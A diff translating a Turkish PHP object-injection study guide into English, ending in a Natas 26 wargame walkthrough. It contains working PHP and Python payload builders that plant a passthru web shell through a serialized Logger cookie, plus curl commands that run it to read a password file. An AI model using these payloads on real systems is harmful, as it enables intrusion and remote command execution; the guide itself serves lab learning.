@@ -1,24 +1,24 @@
-# 🌐 Web Güvenliği — PHP Object Injection (Deserialization)
+# 🌐 Web Security — PHP Object Injection (Deserialization)
 
-> PHP nesneleri serialize edip cookie'de saklayabilir.
-> Eğer bu veriyi kontrol edebilirsen, sunucu istediğin nesneyi oluşturur.
-
----
-
-## 📋 İçindekiler
-
-- [Serialize / Unserialize Nedir?](#serialize--unserialize-nedir)
-- [PHP Serialize Formatı](#php-serialize-formatı)
-- [Magic Method'lar](#magic-methodlar)
-- [Kötü Amaçlı Nesne Oluşturma](#kötü-amaçlı-nesne-oluşturma)
-- [Natas'ta Kullanım](#natasta-kullanım)
+> PHP can serialize objects and store them in a cookie.
+> If you can control this data, the server creates whatever object you want.
 
 ---
 
-## Serialize / Unserialize Nedir?
+## 📋 Table of Contents
 
-**Serialize:** PHP nesnesini veya dizisini saklanabilir/iletilebilir string'e dönüştürme.
-**Unserialize:** Bu string'den orijinal nesneyi/diziyi geri oluşturma.
+- [What Is Serialize / Unserialize?](#what-is-serialize--unserialize)
+- [PHP Serialize Format](#php-serialize-format)
+- [Magic Methods](#magic-methods)
+- [Creating a Malicious Object](#creating-a-malicious-object)
+- [Usage in Natas](#usage-in-natas)
+
+---
+
+## What Is Serialize / Unserialize?
+
+**Serialize:** Converting a PHP object or array into a storable/transmittable string.
+**Unserialize:** Reconstructing the original object/array from this string.
 
 ```php
 $data = ["username" => "admin", "role" => "user"];
@@ -29,22 +29,22 @@ $back = unserialize($str);
 // ["username" => "admin", "role" => "user"]
 ```
 
-Web uygulamaları bunu cookie veya hidden input'ta kullanabilir.
+Web applications may use this in a cookie or hidden input.
 
 ---
 
-## PHP Serialize Formatı
+## PHP Serialize Format
 
 ```
-a:2:{...}           → array, 2 eleman
-s:5:"admin"         → string, 5 karakter, "admin"
+a:2:{...}           → array, 2 elements
+s:5:"admin"         → string, 5 characters, "admin"
 i:1                 → integer, 1
 b:1                 → boolean, true (0=false, 1=true)
 N                   → null
-O:4:"User":2:{...}  → Object, sınıf adı 4 karakter "User", 2 property
+O:4:"User":2:{...}  → Object, class name 4 characters "User", 2 properties
 ```
 
-### Örnek Nesne
+### Example Object
 
 ```php
 class Logger {
@@ -59,32 +59,32 @@ echo serialize($obj);
 
 ---
 
-## Magic Method'lar
+## Magic Methods
 
-PHP'de bazı özel metodlar belirli olaylarda otomatik çağrılır:
+In PHP, certain special methods are called automatically on specific events:
 
-| Method | Ne Zaman Çağrılır |
+| Method | When It's Called |
 |--------|-------------------|
-| `__construct()` | Nesne oluşturulduğunda |
-| `__destruct()` | Nesne yok edildiğinde (script bitişinde) |
-| `__wakeup()` | `unserialize()` sonrası |
-| `__sleep()` | `serialize()` öncesi |
-| `__toString()` | Nesne string'e dönüştürüldüğünde |
+| `__construct()` | When an object is created |
+| `__destruct()` | When an object is destroyed (at the end of the script) |
+| `__wakeup()` | After `unserialize()` |
+| `__sleep()` | Before `serialize()` |
+| `__toString()` | When an object is converted to a string |
 
-### Neden Tehlikeli?
+### Why Is It Dangerous?
 
-`unserialize()` çağrıldığında:
-1. String parse edilir, nesne oluşturulur
-2. `__wakeup()` otomatik çağrılır
-3. Script bitişinde `__destruct()` otomatik çağrılır
+When `unserialize()` is called:
+1. The string is parsed, the object is created
+2. `__wakeup()` is called automatically
+3. At the end of the script, `__destruct()` is called automatically
 
-Eğer bu method'lar tehlikeli işlemler yapıyorsa (dosya yazma, komut çalıştırma), kötü amaçlı serialize string ile bu işlemler tetiklenebilir.
+If these methods perform dangerous operations (writing files, running commands), those operations can be triggered with a malicious serialize string.
 
 ---
 
-## Kötü Amaçlı Nesne Oluşturma
+## Creating a Malicious Object
 
-### Senaryo
+### Scenario
 
 ```php
 class Logger {
@@ -92,13 +92,13 @@ class Logger {
     private $exitMsg;
 
     public function __destruct() {
-        // Script bitişinde log dosyasına exitMsg yaz
+        // Write exitMsg to the log file at the end of the script
         file_put_contents($this->logFile, $this->exitMsg);
     }
 }
 ```
 
-`__destruct()` `file_put_contents` çağırıyor. Eğer `$logFile` ve `$exitMsg`'yi kontrol edebilirsek:
+`__destruct()` calls `file_put_contents`. If we can control `$logFile` and `$exitMsg`:
 
 ```php
 $evil = new Logger();
@@ -109,15 +109,15 @@ echo serialize($evil);
 // O:6:"Logger":2:{s:..:"logFile";s:26:"/var/www/html/shell.php";s:..:"exitMsg";s:33:"<?php passthru($_GET['cmd']); ?>";}
 ```
 
-Bu string `unserialize()` edildiğinde script bitişinde shell.php oluşturulur.
+When this string is `unserialize()`d, shell.php is created at the end of the script.
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 26 — Logger Sınıfı ile RCE
+### Natas 26 — RCE with the Logger Class
 
-**Kaynak kod (özet):**
+**Source code (summary):**
 
 ```php
 class Logger {
@@ -139,20 +139,20 @@ class Logger {
 
     function __destruct() {
         $fd = fopen($this->logFile, "a+");
-        fwrite($fd, $this->exitMsg);   // ← exitMsg dosyaya yazılıyor
+        fwrite($fd, $this->exitMsg);   // ← exitMsg is written to the file
         fclose($fd);
     }
 }
 
-// Cookie'den nesneyi restore et
+// Restore the object from the cookie
 if(array_key_exists("drawing", $_COOKIE)) {
     $drawing = unserialize(base64_decode($_COOKIE["drawing"]));
 }
 ```
 
-**Exploit Adımları:**
+**Exploit Steps:**
 
-**Adım 1: Kötü amaçlı Logger nesnesi oluştur**
+**Step 1: Create a malicious Logger object**
 
 ```php
 <?php
@@ -163,23 +163,23 @@ class Logger {
 }
 
 $obj = new Logger();
-// Private property'lere yansıma ile eriş
+// Access the private properties via reflection
 $obj_ref = new ReflectionClass($obj);
 
-// Veya serialize string'i doğrudan oluştur:
+// Or build the serialize string directly:
 $payload = 'O:6:"Logger":3:{s:15:"' . "\0Logger\0" . 'logFile";s:28:"/var/www/html/img/shell.php";s:15:"' . "\0Logger\0" . 'initMsg";s:0:"";s:14:"' . "\0Logger\0" . 'exitMsg";s:33:"<?php passthru($_GET[\'cmd\']); ?>";}';
 
 echo base64_encode($payload);
 ```
 
-Private property'lerin serialize formatı: `\0ClassName\0propertyName`
+The serialize format of private properties: `\0ClassName\0propertyName`
 
-**Python ile payload oluşturma:**
+**Creating the payload with Python:**
 
 ```python
 import base64
 
-# Private property formatı: \x00ClassName\x00propertyName
+# Private property format: \x00ClassName\x00propertyName
 log_file = "/var/www/html/img/shell.php"
 exit_msg = "<?php passthru($_GET['cmd']); ?>"
 
@@ -196,42 +196,42 @@ payload = (
 print(base64.b64encode(payload.encode('latin-1')).decode())
 ```
 
-**Adım 2: Cookie olarak gönder**
+**Step 2: Send it as a cookie**
 
 ```bash
-curl -u natas26:[şifre] \
+curl -u natas26:[password] \
      -b "drawing=[BASE64_PAYLOAD]" \
      "http://natas26.natas.labs.overthewire.org/"
 ```
 
-**Adım 3: Oluşturulan shell'i çalıştır**
+**Step 3: Run the created shell**
 
 ```bash
-curl -u natas26:[şifre] \
+curl -u natas26:[password] \
      "http://natas26.natas.labs.overthewire.org/img/shell.php?cmd=cat+/etc/natas_webpass/natas27"
 ```
 
 ---
 
-### Object Injection — Kontrol Listesi
+### Object Injection — Checklist
 
 ```
-Tespit:
-  ☐ Cookie veya parametre Base64 → decode → O: ile başlıyor mu?
-  ☐ Kaynak kodda unserialize() var mı?
-  ☐ __destruct veya __wakeup tehlikeli işlem yapıyor mu?
+Detection:
+  ☐ Cookie or parameter Base64 → decode → does it start with O:?
+  ☐ Is there an unserialize() in the source code?
+  ☐ Do __destruct or __wakeup perform a dangerous operation?
 
 Exploit:
-  ☐ Sınıf tanımını kaynak koddan kopyala
-  ☐ Tehlikeli property'leri ayarla (logFile, exitMsg)
-  ☐ Serialize → Base64 encode → cookie olarak gönder
+  ☐ Copy the class definition from the source code
+  ☐ Set the dangerous properties (logFile, exitMsg)
+  ☐ Serialize → Base64 encode → send as a cookie
   ☐ Private property: \x00ClassName\x00propertyName
-  ☐ Yüklenen dosyaya eriş → komut çalıştır
+  ☐ Access the uploaded file → run a command
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization)
 - [OWASP — Deserialization](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
@@ -239,7 +239,7 @@ Exploit:
 
 ---
 
-**Önceki konu:** [17_php_type_juggling.md](./17_php_type_juggling.md)
-**Sonraki konu:** [19_sql_truncation.md](./19_sql_truncation.md)
+**Previous topic:** [17_php_type_juggling.md](./17_php_type_juggling.md)
+**Next topic:** [19_sql_truncation.md](./19_sql_truncation.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
